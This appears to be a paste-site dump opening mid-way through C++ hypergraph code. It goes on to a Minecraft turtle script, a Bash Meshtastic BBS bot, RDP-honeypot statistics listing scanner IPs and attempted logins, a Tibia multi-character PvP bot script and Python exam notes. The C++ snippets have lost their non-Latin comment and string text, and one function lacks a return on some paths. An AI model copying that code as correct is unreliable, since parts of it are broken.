    g_1.resize(m);

    loop(i, 0, n){
        for(auto q : g[i]){ //    
            for(auto q_1 : g[i]){
                if(q != q_1){
                    g_1[q].pb(q_1); //  ,  
//                    g_1[q_1].pb(q);
                }
            }
        }
    }
    // 
    vector<vector<int>> g_2;
    g_2.resize(n);

    loop(i, 0, n){
        loop(j, 0, n){
            if(j != i){
                for(auto q : g[i]){
                    for(auto q_1 : g[j]){
                        if(q_1 == q){
                            g_2[i].pb(j); //  ,   ,      .
                        }
                    }
                }

            }
        }
    }

}
void l5(){
    vector<vector<int>> g_1;
    g_1.resize(n);
    vector<int> v;
    int v_n;
    cin >> v_n;
    v.resize(v_n);
    loop(i, 0, v_n) cin >> v[i];

    loop(i, 0, n){
        for(auto q : v){
            if(q - 1 == i){
                g_1[i] = g[i];
            }
        }
    }
}
void l6(){
    vector<vector<int>> g_1;
    vector<int> e;
    int e_n;
    cin >> e_n;
    e.resize(e_n);
    g_1.resize(n);
    loop(i, 0, e_n) cin >> e[i];

    loop(i, 0, n){
        int added = 0;
        for(auto ej : g[i]){ //   
            for(auto k : e){
                if(k == ej){
                    g_1[i] = g[i];
                    added = 1;
                    break;
                }
            }
            if(added) break;
        }
    }
}

vector<pair<vector<int>, set<int>>> g_1;
vector<bool> used;
bool dfs(int v){
    used[v] = true;
    for(int u : g_1[v].f){
        if(!used[u]){
            dfs(u);
            if(g_1[v].s == g_1[u].s){
                return true;
            }
            return false;
        }
    }
}

void s_helly(){
    // 
    vector<pair<vector<int>, set<int>>> g_1;
    g_1.resize(m);

    loop(i, 0, n){
        for(auto q : g[i]){ //    
            for(auto q_1 : g[i]){
                if(q != q_1){
                    g_1[q].f.pb(q_1); //  ,  
//                    g_1[q_1].pb(q);
                    //              ,
                    //   
                    g_1[q].s.insert(i);
                    //    -   ( ),  
                    // q_1[i].s   .
                }
            }
        }
    }
    used.resize(m, false);
    loop(i, 0, m){
        if(!used[i]){
            bool ch = dfs(i);
            if(!ch){
                cout << ""Not Helly!\n"";
                return;
            }
        }
    }
    cout << ""Is Helly\n"";

}
void solve(){
    cin >> n >> m;

    g.resize(n);
    inc.resize(n);
    loop(i, 0, n){
        loop(j, 0, m){
            int q;
            cin >> q;
            inc[i].pb(q);
            if(q){
                g[i].pb(j);
            }
        }
    }
    cve(g);



}

int main() {
#ifdef DEBUG
    freopen(""text.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
#endif
    solve();
}
"
0Tifst80,auto dome cc tweaked turtle full,Ziro-00,Lua,Saturday 17th of February 2024 08:06:32 PM CDT,"function colocar()
    turtle.place()
    turtle.back()
end
 
function down()
    turtle.turnLeft()
    turtle.forward()
    turtle.turnRight()
end
 
function up()
    turtle.turnRight()
    turtle.forward()
    turtle.turnLeft()
end
 
function ya()
    down()
    turtle.place()
end

-- function verificar()
--	local cont = turtle.getItemCount()
--	if cont < 5 then
--		turtle.select(turtle.getSelectedSlot() + 1)
 
turtle.refuel(all)
turtle.select(3)

for i=1,3 do
    colocar()
end
 
up()
 
for i=1,3 do
    colocar()
end
 
down()
 
for i=1,2 do
    colocar()
end
 
down()
 
for i=1,3 do
    colocar()
end
 
for i=1,6 do
    down()
    colocar()
end
 
for i=1,3 do
    ya()
end
 
turtle.back()
 
for i=1,2 do
    ya()
end
 
turtle.back()
down()
turtle.place()
 
for i=1,2 do
    ya()
end
 
down()
turtle.forward()
turtle.place()
 
for i=1,4 do
    ya()
end

-- fim do script 1
-- 30 qtz

turtle.turnLeft()
turtle.forward()
turtle.forward()
turtle.turnLeft()
turtle.turnLeft()

for i=1,3 do
	colocar()
end
 
down()
 
for i=1,2 do
	colocar()
end
 
down()
 
for i=1,3 do
	colocar()
end
 
for i=1,6 do
	down()
	colocar()
end
 
for i=1,3 do
    ya()
end
 
turtle.back()
 
for i=1,2 do
    ya()
end
 
turtle.back()
down()
turtle.place()
 
for i=1,2 do
    ya()
end

-- fim do script 2
-- 52 qtz
turtle.refuel(all)
turtle.turnLeft()

for i=1,7 do
	turtle.forward()
end

-- reset inv slot 4
turtle.select(turtle.getSelectedSlot() + 1)

turtle.turnRight()
turtle.forward()
turtle.turnRight()

for i=1,3 do
    colocar()
end
 
down()
 
for i=1,2 do
    colocar()
end
 
down()
 
for i=1,3 do
	colocar()
end
 
for i=1,6 do
	down()
	colocar()
end
 
for i=1,2 do
    ya()
end
 
down()
colocar()
ya()
down()
colocar()
down()
turtle.place()
 
for i=1,2 do
	ya()
end

-- 32 qtz
-- fim do script3

for i=1,7 do
	turtle.forward()
end

turtle.turnRight()
turtle.forward()
turtle.turnRight()

for i=1,3 do
    colocar()
end
 
down()
 
for i=1,2 do
	colocar()
end	
 
down()
 
for i=1,3 do
    colocar()
end
 
for i=1,6 do
	down()
	colocar()
end
 
for i=1,3 do
    ya()
end
 
turtle.back()
 
for i=1,2 do
    ya()
end
 
turtle.back()
 
for i=1,3 do
	ya()
end
 
down()
turtle.forward()
turtle.place()
ya()

-- 56 qrtz
-- fim do script 4

turtle.select(turtle.getSelectedSlot() + 1)
turtle.refuel(all)"
UcF6i5mi,meshbbs.sh,howtophil,Bash,Saturday 17th of February 2024 08:00:19 PM CDT,"#!/bin/bash

#----------------------------------
# A proof of concept to watch for
# and respond to Meshtastic
# messages over serial (USBserial).
#
# More here than the first paste.
#
# Can be thought of as a bash-based
# BBS or Meshtastic Bot.
#
# Requires: bash, stty, meshtastic (cli),
# sed, tr, grep...
#
# Make sure ""Debug log enabled""
# is checked to on in the
# Radio Configuration->Device menu
# of Meshtastic
#
# ~HowToPhil Updated 2024/02/17 21:00 EST
#----------------------------------

#--------------------------------------
# A Bulletin Board System
# at least needs System Bulletins
#--------------------------------------
systemBulletins () {
	meshtastic --sendtext ""The system is new
and not at all stable.
and you can see this bulletin now!""

}

#--------------------------------------
# A function to handle commands
#--------------------------------------
parseCommand () {
	echo ""$1 in parseCommand""

	#The help/menu
	if [ ""$1"" == ""help"" ]; then
		meshtastic --sendtext ""This is a SUPER-SIMPLE BBS on Meshtastic!
Use these commands:
@meshbbs help - Show this help message
@meshbbs weather [location] - The weather at a location
@meshbbs bulletins - System bulletins
""
	fi

	#The weather
	if [ $1 == ""weather"" ]; then
		meshtastic --sendtext ""`ansiweather -l $2 $3 $4 |sed -e 's/\x1b\[[0-9;]*m//g'`""
	fi

	#System Bulletins Pass-Off
	if [ $1 == ""bulletins"" ]; then
		systemBulletins
	fi

}

#--------------------------------------
# The loop that looks for commands
# and responds to those commands
#--------------------------------------
while [ 1==1 ]; do
	#configure the USB serial port properly
	stty -F /dev/ttyUSB0 115200 -echo -icrnl raw

	#start watching for a command
	COMMAND=$(grep -a -m1 ""@meshbbs"" /dev/ttyUSB0| grep ""^INFO""|sed 's/.*@meshbbs //'| tr -d ""\r"")

	#do something with the command
	echo ""GOT $COMMAND""
	parseCommand $COMMAND
done
"
pzjYSNHX,motd for my fan game,Yobanzda,Lua,Saturday 17th of February 2024 07:34:27 PM CDT,WELCOME TO DEFAULT TAG! THIS IS A NOICE GAME THAT HAVE FLOOR IS LAVA AND SUM MORE COOL STUFF. IM GONNA BE ADDING MORE STUFF SOON LIKE HORROR N STUFF AND I LIKE TO SAY STUFF SO GOODBYE! SEE YA LATER!
GkJK5nXX,Untitled,35657,C++,Saturday 17th of February 2024 07:33:22 PM CDT,"
#include <iostream> 

using namespace std;


int main() {
    setlocale(LC_ALL, ""Russian"");

    int month_number, day_number, days_count = 31;

    cout << ""  : "";
    cin >> month_number;


    cout << ""  : "";
    cin >> day_number;

    int sunday = 8 - day_number;
    int saturday = sunday - 1;
    int weekend = 0;

    if (month_number == 4 || month_number == 6 || month_number == 9 || month_number == 11) {
        days_count = 30;
    }
    if (month_number == 2) {
        days_count = 28;
    }

    cout << ""\tMo\tTu\tWe\tTh\tFr\tSa\tSu"" << endl;

    for (int i = 1; i < day_number; i++) {
        cout << ""\t_"";
    }

    for (int i = 1; i <= days_count; i++) {
        cout << ""\t"" << i;
        if (i == saturday) {
            weekend++;
        }
        if (i == sunday) {
            cout << endl;
            weekend++;
            sunday += 7;
            saturday += 7;
        }
    }
    cout << endl << endl;;
    cout << ""\t  "" << weekend << "" "" << endl;
}"
9G4HAX7M,2024-02-17_stats.json,rdp_snitch,JSON,Saturday 17th of February 2024 06:18:06 PM CDT,"{
  ""ip"": {
    ""162.142.125.224"": 3,
    ""107.175.57.165"": 6,
    ""45.87.212.180"": 6,
    ""194.165.16.76"": 6,
    ""205.210.31.209"": 9,
    ""61.91.43.232"": 6,
    ""45.227.254.54"": 6,
    ""87.251.75.145"": 9,
    ""147.78.47.34"": 3,
    ""45.79.93.238"": 6,
    ""185.190.24.54"": 3,
    ""185.170.144.3"": 6,
    ""58.27.152.130"": 3,
    ""198.235.24.64"": 9,
    ""62.204.41.107"": 12,
    ""193.37.69.213"": 9,
    ""196.190.117.7"": 6,
    ""185.129.51.9"": 6,
    ""194.165.16.73"": 6,
    ""165.154.128.17"": 3,
    ""89.248.170.88"": 3,
    ""194.165.16.10"": 6,
    ""120.240.145.8"": 3,
    ""45.76.184.55"": 9,
    ""205.210.31.83"": 9,
    ""212.70.149.142"": 12,
    ""216.24.210.126"": 3,
    ""205.210.31.164"": 9,
    ""212.70.149.146"": 3
  },
  ""asn"": {
    ""AS398324"": 3,
    ""AS36352"": 6,
    ""AS9009"": 6,
    ""AS48721"": 18,
    ""AS396982"": 36,
    ""AS7470"": 6,
    ""AS267784"": 6,
    ""AS208091"": 18,
    ""AS209588"": 3,
    ""AS63949"": 6,
    ""AS211632"": 3,
    ""AS197414"": 6,
    ""AS38264"": 3,
    ""AS59425"": 12,
    ""AS24757"": 6,
    ""AS200532"": 6,
    ""AS135377"": 3,
    ""AS202425"": 3,
    ""AS56040"": 3,
    ""AS20473"": 9,
    ""AS204428"": 15,
    ""AS62240"": 3
  },
  ""isp"": {
    ""Censys, Inc."": 3,
    ""HostPapa"": 6,
    ""M247 Europe SRL"": 6,
    ""Flyservers S.A."": 27,
    ""Google LLC"": 36,
    ""True Internet Corporation CO. Ltd."": 6,
    ""Xhost Internet Solutions LP"": 15,
    ""Akamai Technologies, Inc."": 6,
    ""Internet Solutions & Innovations LTD."": 3,
    ""Wateen Telecom Limited"": 3,
    ""Horizon LLC"": 12,
    ""Xhost Internet Solutions"": 9,
    ""Ethiotelecom"": 6,
    ""LLP \""Kompaniya Hoster.KZ\"""": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""IP Volume inc"": 3,
    ""China Mobile communications corporation"": 3,
    ""The Constant Company"": 9,
    ""SS-Net"": 15,
    ""Clouvider Limited"": 3
  },
  ""org"": {
    ""Censys Inc"": 3,
    ""ColoCrossing"": 6,
    ""M247 LTD"": 6,
    ""Flyservers S.A"": 21,
    ""Palo Alto Networks, Inc"": 36,
    ""True Internet Corporation CO. LTD"": 6,
    ""UAB Host Baltic"": 6,
    ""Xhost Internet Solutions"": 9,
    ""Linode"": 6,
    ""Tribeka Web Advisors S.A"": 3,
    ""Xhostis"": 6,
    ""Wateen Telecom Limited"": 3,
    ""Horizon LLC"": 12,
    ""XHOSTIS"": 9,
    ""Unknown"": 6,
    ""Hosterkz Network"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Quasi Networks LTD."": 3,
    ""China Mobile"": 3,
    ""Vultr Holdings, LLC"": 9,
    ""4Media Ltd"": 15,
    ""IPXO"": 3
  },
  ""regionName"": {
    ""Michigan"": 3,
    ""New York"": 6,
    ""Hesse"": 6,
    ""Kaunas"": 18,
    ""California"": 45,
    ""Bangkok"": 6,
    ""Vilnius"": 6,
    ""North Holland"": 30,
    ""Mariehamns stad"": 3,
    ""Punjab"": 3,
    ""Moscow"": 12,
    ""Addis Ababa"": 6,
    ""Karaganda"": 6,
    ""England"": 3,
    ""Guangdong"": 3,
    ""Central Singapore"": 9,
    ""Plovdiv"": 15
  },
  ""country"": {
    ""United States"": 54,
    ""Germany"": 6,
    ""Lithuania"": 24,
    ""Thailand"": 6,
    ""The Netherlands"": 30,
    ""Aland Islands"": 3,
    ""Pakistan"": 3,
    ""Russia"": 12,
    ""Ethiopia"": 6,
    ""Kazakhstan"": 6,
    ""United Kingdom"": 3,
    ""China"": 3,
    ""Singapore"": 9,
    ""Bulgaria"": 15
  },
  ""account"": {
    ""(empty)"": 18,
    ""Test"": 51,
    ""GBammKcBq"": 3,
    ""SZMOHL"": 3,
    ""YGykDS"": 3,
    ""Administr"": 30,
    ""hello"": 27,
    ""vGuGYbNNT"": 3,
    ""ehAxnM"": 3,
    ""oSaknC"": 3,
    ""Domain"": 15,
    ""Administrator"": 3,
    ""eoAeYqqxH"": 3,
    ""oKlDiT"": 3,
    ""xHnVhM"": 3,
    ""JYBhgQuBl"": 3,
    ""ObaOAF"": 3,
    ""qJSdGJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 180
  },
  ""client_build"": {
    ""Unknown"": 180
  },
  ""client_name"": {
    ""Unknown"": 180
  },
  ""ip_type"": {
    ""Unknown"": 96,
    ""hosting"": 66,
    ""hosting & proxy"": 6,
    ""mobile"": 6,
    ""mobile & hosting & proxy"": 3,
    ""proxy"": 3
  }
}"
4RQb93jS,2024-02-17_stats.json,rdp_snitch,JSON,Saturday 17th of February 2024 06:16:05 PM CDT,"{
  ""ip"": {
    ""162.142.125.224"": 2,
    ""107.175.57.165"": 4,
    ""45.87.212.180"": 4,
    ""194.165.16.76"": 4,
    ""205.210.31.209"": 6,
    ""61.91.43.232"": 4,
    ""45.227.254.54"": 4,
    ""87.251.75.145"": 6,
    ""147.78.47.34"": 2,
    ""45.79.93.238"": 4,
    ""185.190.24.54"": 2,
    ""185.170.144.3"": 4,
    ""58.27.152.130"": 2,
    ""198.235.24.64"": 6,
    ""62.204.41.107"": 8,
    ""193.37.69.213"": 6,
    ""196.190.117.7"": 4,
    ""185.129.51.9"": 4,
    ""194.165.16.73"": 4,
    ""165.154.128.17"": 2,
    ""89.248.170.88"": 2,
    ""194.165.16.10"": 4,
    ""120.240.145.8"": 2,
    ""45.76.184.55"": 6,
    ""205.210.31.83"": 6,
    ""212.70.149.142"": 8,
    ""216.24.210.126"": 2,
    ""205.210.31.164"": 6,
    ""212.70.149.146"": 2
  },
  ""asn"": {
    ""AS398324"": 2,
    ""AS36352"": 4,
    ""AS9009"": 4,
    ""AS48721"": 12,
    ""AS396982"": 24,
    ""AS7470"": 4,
    ""AS267784"": 4,
    ""AS208091"": 12,
    ""AS209588"": 2,
    ""AS63949"": 4,
    ""AS211632"": 2,
    ""AS197414"": 4,
    ""AS38264"": 2,
    ""AS59425"": 8,
    ""AS24757"": 4,
    ""AS200532"": 4,
    ""AS135377"": 2,
    ""AS202425"": 2,
    ""AS56040"": 2,
    ""AS20473"": 6,
    ""AS204428"": 10,
    ""AS62240"": 2
  },
  ""isp"": {
    ""Censys, Inc."": 2,
    ""HostPapa"": 4,
    ""M247 Europe SRL"": 4,
    ""Flyservers S.A."": 18,
    ""Google LLC"": 24,
    ""True Internet Corporation CO. Ltd."": 4,
    ""Xhost Internet Solutions LP"": 10,
    ""Akamai Technologies, Inc."": 4,
    ""Internet Solutions & Innovations LTD."": 2,
    ""Wateen Telecom Limited"": 2,
    ""Horizon LLC"": 8,
    ""Xhost Internet Solutions"": 6,
    ""Ethiotelecom"": 4,
    ""LLP \""Kompaniya Hoster.KZ\"""": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""IP Volume inc"": 2,
    ""China Mobile communications corporation"": 2,
    ""The Constant Company"": 6,
    ""SS-Net"": 10,
    ""Clouvider Limited"": 2
  },
  ""org"": {
    ""Censys Inc"": 2,
    ""ColoCrossing"": 4,
    ""M247 LTD"": 4,
    ""Flyservers S.A"": 14,
    ""Palo Alto Networks, Inc"": 24,
    ""True Internet Corporation CO. LTD"": 4,
    ""UAB Host Baltic"": 4,
    ""Xhost Internet Solutions"": 6,
    ""Linode"": 4,
    ""Tribeka Web Advisors S.A"": 2,
    ""Xhostis"": 4,
    ""Wateen Telecom Limited"": 2,
    ""Horizon LLC"": 8,
    ""XHOSTIS"": 6,
    ""Unknown"": 4,
    ""Hosterkz Network"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Quasi Networks LTD."": 2,
    ""China Mobile"": 2,
    ""Vultr Holdings, LLC"": 6,
    ""4Media Ltd"": 10,
    ""IPXO"": 2
  },
  ""regionName"": {
    ""Michigan"": 2,
    ""New York"": 4,
    ""Hesse"": 4,
    ""Kaunas"": 12,
    ""California"": 30,
    ""Bangkok"": 4,
    ""Vilnius"": 4,
    ""North Holland"": 20,
    ""Mariehamns stad"": 2,
    ""Punjab"": 2,
    ""Moscow"": 8,
    ""Addis Ababa"": 4,
    ""Karaganda"": 4,
    ""England"": 2,
    ""Guangdong"": 2,
    ""Central Singapore"": 6,
    ""Plovdiv"": 10
  },
  ""country"": {
    ""United States"": 36,
    ""Germany"": 4,
    ""Lithuania"": 16,
    ""Thailand"": 4,
    ""The Netherlands"": 20,
    ""Aland Islands"": 2,
    ""Pakistan"": 2,
    ""Russia"": 8,
    ""Ethiopia"": 4,
    ""Kazakhstan"": 4,
    ""United Kingdom"": 2,
    ""China"": 2,
    ""Singapore"": 6,
    ""Bulgaria"": 10
  },
  ""account"": {
    ""(empty)"": 12,
    ""Test"": 34,
    ""GBammKcBq"": 2,
    ""SZMOHL"": 2,
    ""YGykDS"": 2,
    ""Administr"": 20,
    ""hello"": 18,
    ""vGuGYbNNT"": 2,
    ""ehAxnM"": 2,
    ""oSaknC"": 2,
    ""Domain"": 10,
    ""Administrator"": 2,
    ""eoAeYqqxH"": 2,
    ""oKlDiT"": 2,
    ""xHnVhM"": 2,
    ""JYBhgQuBl"": 2,
    ""ObaOAF"": 2,
    ""qJSdGJ"": 2
  },
  ""keyboard"": {
    ""Unknown"": 120
  },
  ""client_build"": {
    ""Unknown"": 120
  },
  ""client_name"": {
    ""Unknown"": 120
  },
  ""ip_type"": {
    ""Unknown"": 64,
    ""hosting"": 44,
    ""hosting & proxy"": 4,
    ""mobile"": 4,
    ""mobile & hosting & proxy"": 2,
    ""proxy"": 2
  }
}"
SP2VtAxH,2024-02-17_stats.json,rdp_snitch,JSON,Saturday 17th of February 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""162.142.125.224"": 1,
    ""107.175.57.165"": 2,
    ""45.87.212.180"": 2,
    ""194.165.16.76"": 2,
    ""205.210.31.209"": 3,
    ""61.91.43.232"": 2,
    ""45.227.254.54"": 2,
    ""87.251.75.145"": 3,
    ""147.78.47.34"": 1,
    ""45.79.93.238"": 2,
    ""185.190.24.54"": 1,
    ""185.170.144.3"": 2,
    ""58.27.152.130"": 1,
    ""198.235.24.64"": 3,
    ""62.204.41.107"": 4,
    ""193.37.69.213"": 3,
    ""196.190.117.7"": 2,
    ""185.129.51.9"": 2,
    ""194.165.16.73"": 2,
    ""165.154.128.17"": 1,
    ""89.248.170.88"": 1,
    ""194.165.16.10"": 2,
    ""120.240.145.8"": 1,
    ""45.76.184.55"": 3,
    ""205.210.31.83"": 3,
    ""212.70.149.142"": 4,
    ""216.24.210.126"": 1,
    ""205.210.31.164"": 3,
    ""212.70.149.146"": 1
  },
  ""asn"": {
    ""AS398324"": 1,
    ""AS36352"": 2,
    ""AS9009"": 2,
    ""AS48721"": 6,
    ""AS396982"": 12,
    ""AS7470"": 2,
    ""AS267784"": 2,
    ""AS208091"": 6,
    ""AS209588"": 1,
    ""AS63949"": 2,
    ""AS211632"": 1,
    ""AS197414"": 2,
    ""AS38264"": 1,
    ""AS59425"": 4,
    ""AS24757"": 2,
    ""AS200532"": 2,
    ""AS135377"": 1,
    ""AS202425"": 1,
    ""AS56040"": 1,
    ""AS20473"": 3,
    ""AS204428"": 5,
    ""AS62240"": 1
  },
  ""isp"": {
    ""Censys, Inc."": 1,
    ""HostPapa"": 2,
    ""M247 Europe SRL"": 2,
    ""Flyservers S.A."": 9,
    ""Google LLC"": 12,
    ""True Internet Corporation CO. Ltd."": 2,
    ""Xhost Internet Solutions LP"": 5,
    ""Akamai Technologies, Inc."": 2,
    ""Internet Solutions & Innovations LTD."": 1,
    ""Wateen Telecom Limited"": 1,
    ""Horizon LLC"": 4,
    ""Xhost Internet Solutions"": 3,
    ""Ethiotelecom"": 2,
    ""LLP \""Kompaniya Hoster.KZ\"""": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""IP Volume inc"": 1,
    ""China Mobile communications corporation"": 1,
    ""The Constant Company"": 3,
    ""SS-Net"": 5,
    ""Clouvider Limited"": 1
  },
  ""org"": {
    ""Censys Inc"": 1,
    ""ColoCrossing"": 2,
    ""M247 LTD"": 2,
    ""Flyservers S.A"": 7,
    ""Palo Alto Networks, Inc"": 12,
    ""True Internet Corporation CO. LTD"": 2,
    ""UAB Host Baltic"": 2,
    ""Xhost Internet Solutions"": 3,
    ""Linode"": 2,
    ""Tribeka Web Advisors S.A"": 1,
    ""Xhostis"": 2,
    ""Wateen Telecom Limited"": 1,
    ""Horizon LLC"": 4,
    ""XHOSTIS"": 3,
    ""Unknown"": 2,
    ""Hosterkz Network"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Quasi Networks LTD."": 1,
    ""China Mobile"": 1,
    ""Vultr Holdings, LLC"": 3,
    ""4Media Ltd"": 5,
    ""IPXO"": 1
  },
  ""regionName"": {
    ""Michigan"": 1,
    ""New York"": 2,
    ""Hesse"": 2,
    ""Kaunas"": 6,
    ""California"": 15,
    ""Bangkok"": 2,
    ""Vilnius"": 2,
    ""North Holland"": 10,
    ""Mariehamns stad"": 1,
    ""Punjab"": 1,
    ""Moscow"": 4,
    ""Addis Ababa"": 2,
    ""Karaganda"": 2,
    ""England"": 1,
    ""Guangdong"": 1,
    ""Central Singapore"": 3,
    ""Plovdiv"": 5
  },
  ""country"": {
    ""United States"": 18,
    ""Germany"": 2,
    ""Lithuania"": 8,
    ""Thailand"": 2,
    ""The Netherlands"": 10,
    ""Aland Islands"": 1,
    ""Pakistan"": 1,
    ""Russia"": 4,
    ""Ethiopia"": 2,
    ""Kazakhstan"": 2,
    ""United Kingdom"": 1,
    ""China"": 1,
    ""Singapore"": 3,
    ""Bulgaria"": 5
  },
  ""account"": {
    ""(empty)"": 6,
    ""Test"": 17,
    ""GBammKcBq"": 1,
    ""SZMOHL"": 1,
    ""YGykDS"": 1,
    ""Administr"": 10,
    ""hello"": 9,
    ""vGuGYbNNT"": 1,
    ""ehAxnM"": 1,
    ""oSaknC"": 1,
    ""Domain"": 5,
    ""Administrator"": 1,
    ""eoAeYqqxH"": 1,
    ""oKlDiT"": 1,
    ""xHnVhM"": 1,
    ""JYBhgQuBl"": 1,
    ""ObaOAF"": 1,
    ""qJSdGJ"": 1
  },
  ""keyboard"": {
    ""Unknown"": 60
  },
  ""client_build"": {
    ""Unknown"": 60
  },
  ""client_name"": {
    ""Unknown"": 60
  },
  ""ip_type"": {
    ""Unknown"": 32,
    ""hosting"": 22,
    ""hosting & proxy"": 2,
    ""mobile"": 2,
    ""mobile & hosting & proxy"": 1,
    ""proxy"": 1
  }
}"
UcNu7YgL,Mb,Gruzing,Lua,Saturday 17th of February 2024 06:13:28 PM CDT,"
local leaderName = ""Kondra""
local isLeader = (name() == leaderName)
storage.wait = 0
storage.startattack = 0
storage.friends = {}
storage.friendIndex = 1
storage.target = """"

-- set same outfit, will be used to detect friends
if isLeader then
  -- randomize outfit for leader
  local outfit = player:getOutfit()
  outfit.head = math.random(0, 255)
  outfit.body = math.random(0, 255)
  changeOutfit(outfit)
else
  macro(1000, function()
    local leader = getPlayerByName(leaderName)
    if leader then
      local outfit = player:getOutfit()
      local leaderOutfit = leader:getOutfit()     
      if leaderOutfit.head ~= outfit.head or leaderOutfit.body ~= outfit.body then
        outfit.head = leaderOutfit.head
        outfit.body = leaderOutfit.body
        changeOutfit(outfit)
      end
    end
  end)
end

-- update friends, based on same outfit colors
macro(1000, function()
  storage.friends = {}
  local outfit = player:getOutfit()
  for i, spec in ipairs(getSpectators()) do
    if spec:isPlayer() then
      local specOutfit = spec:getOutfit()
      if specOutfit.head == outfit.head and specOutfit.body == outfit.body then
        table.insert(storage.friends, spec:getName())
      end
    end
  end
  table.sort(storage.friends)
  for i, friend in ipairs(storage.friends) do
    if friend == name() then
      storage.friendIndex = i
      break
    end
  end
end)


function magicWallAttack(target)
  local tpos = target:getPosition()
  local offsets = {{-1,0},{0,-1},{0,1},{1,0},{-1,1},{-1,-1},{1,-1},{1,1}}   
  for i=1,10 do
    local offset = offsets[math.random(1,#offsets)]
    if i == 1 then
      offset = offsets[storage.friendIndex]
    end
    local pos = {x=tpos.x - offset[1], y=tpos.y - offset[2], z=tpos.z}
    local tile = g_map.getTile(pos)   
    if tile and tile:isWalkable(false) then -- if can throw magic wall
      info(storage.friendIndex .. "" "" .. pos.x .. "" "" .. pos.y)
      usewith(3156, tile:getGround()) -- use wild growth, magic wall is 3180
      return true
    end
  end 
  info(""no tiles"")
  return false
end

listen(leaderName, function(text)
  local data = decode(text)
  if data and data.say then
    say(data.say)
  end
  if data and data.t ~= nil then   
    storage.target = data.t
    -- attack with paralyze first, ever character every 1s
    info(""wait "" .. storage.target)
    storage.wait = now + 100
    storage.startattack = now + 4000   
    --schedule(1 + (storage.friendIndex - 1) * 1000, function()
    --  local target = getPlayerByName(storage.target)
    --  if not target then
    --    return
    --  end
    --  usewith(3165, target) -- paralyze
    --end)
  end
end)

if isLeader then
    storage.attacking = """"
    macro(25, function()
        local target = g_game.getAttackingCreature()
        if not target then
          if #storage.attacking > 0 then
            say(encode({t=""""}))
          end
          storage.attacking = """"
          return
        end
        if target:getName() ~= storage.attacking  then
          storage.attacking = target:getName()
          say(encode({t=target:getName(), info=""I'm testing otclientv8 bot - https://otland.net/threads/otclientv8-bot.266958 - i will post there my current script, in 1-2h""}))
          storage.wait = now + 500
        end
    end)
end

macro(25, function()
  local target = getPlayerByName(storage.target)
  if not target then
    return
  end
  if storage.wait > now then
    return
  end
  if now > storage.startattack then
    usewith(3155, target) -- sd
    delay(1000)
    return
  end   
  if magicWallAttack(target) then
    delay(250)
    return
  end 
end)

if not isLeader then
  macro(300, ""go to leader/target"", function()
   local target = getPlayerByName(storage.target)
   local leader = getPlayerByName(leaderName)
   if not leader then
    storage.target = """"
   end
   if target then
     autoWalk(target:getPosition())
     return
   end
   if leader then
    autoWalk(leader:getPosition())
   end
  end) 
end
"
H3CdQbi6,webinar-exam-review-2024-02-17,jspill,Python,Saturday 17th of February 2024 05:19:41 PM CDT,"# Exam Review 2024 Feb 17

# Do those LABS
# Ch 2-14... all Labs!
# Ch 21-32 just ADDITIONAL LABS, but important practice!
# get to know the Prac Tests, Ch 33 and 34... more than the Pre

# Use Submit Mode and get them to 100%!!!
# PAY ATTENTION to the unit tests!
# ... then UNIT TEST more! Unit test, unit test, unit test!

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Comp 2: Control Flow
# Comp 3: Modules and Files

# Comp 1: Basic syntax and knowledge: operators, data types, etc

# Operators
# = # assignment
# == # asking a question
# +
# -
# *
# /
# % # modulo... whole number remainder... ""how many whole things didn't fit since the last even division""
# // # floor division... last even division
# <
# >
# <=
# >=
# += # x += 1 --> x = x+1
# -=
# ** # pow(), math.pow()
# !=
# # keywords
# in # membership check... if x in myList:
# not # if not x in myList:
# and
# or # any one True would cause the combo is True... limit OR to 2-3 conditions

# Data Types/Classes
# int
# float
# bool
# str # """"
# list # [ ]
# dict # {key:value}, review Ch 4.5
# tuple # ( ) immutable, Python sees a,b,c as (a,b,c) --> return x,y --> return (x,y)
# set # no duplicates, no order --> no indices, can't slice it, can't sort it, can't reverse
# range # range()... container of consecutive numbers
# file # open()... f.read(), f.readlines(), f.write()

# Comp 2
# Control Flow! The how and when of our programs
# IF statements...  if, if/else, if/elif, if/elif/else
# LOOPS
# WHILE - a general purpose loop, an IF that repeats
# FOR - repeating actions a known number of times -> once for everything in a container
# FOR - repeating action once for everything in a container
# # Check out my For Loops webinar in The Gotchas
# for ___ in _someContainer_:
# for item in myList:
# for char in myStr:
# for key in myDict: # value for that key in myDict[key]
# for n in range():
# for i in range(0, len(myList)): # for i in range(0, len(myList), 2)
# for i, item in enumerate(myList):

# FUNCTIONS
# defining/writing a function vs calling
# modular... a function has ONE job
# print/output or return (or maybe something else)
# parameters are special variables for holding stuff coming into the function
# parameters vs arguments
#
# def someFunction(x, y):
#     return x - y
#
# if __name__ == ""__main__"": # is this script the one that's running now
#     # inside this block we're answering this specific question
#     input1 = int(input())
#     input2 = int(input())
#     myNum = someFunction(input1, input2)
#     print(myNum)

# CodingBat also has good function-based Python questions:
# https://codingbat.com/python
# See ""tasks"" in the last section of Ch 10, 11, 13, 14 for function writing practice

# BUILT-IN FUNCTIONS
# input()
# print()
# len()
# range()
# int()
# float()
# list()
# tuple()
# dict()
# str()
# sum()
# min()
# max()
# enumerate()
# round() # cousins math.ceil() and math.floor()
# pow() # cousin math.pow() and **
# abs() # cousin math.fabs()
# type() # print(type(x).__name__)
# open() # for file object
# help()
# dir()
# help(str) # help(str.isspace)
# print(dir(str))

# STRINGS
# be able to refer to indices, and slice
# myStr = ""abcd""
# # mySlice[start:stop:step]
# revStr = myStr[::-1]
# print(revStr)

# KNOW YOUR WHITESPACE
"" "" # space from spacebar
# a lot of Unicode spaces
""\n"" # new line return
""\r"" # carriage return
""\t"" # tab

# unless otherwise stated... printed output should end a new line return... 99% of the time it does anyway
print(""hey"") # --> print(""hey"", end=""\n"")
# we only need to change that when...
#1 ... this specific says to do something else
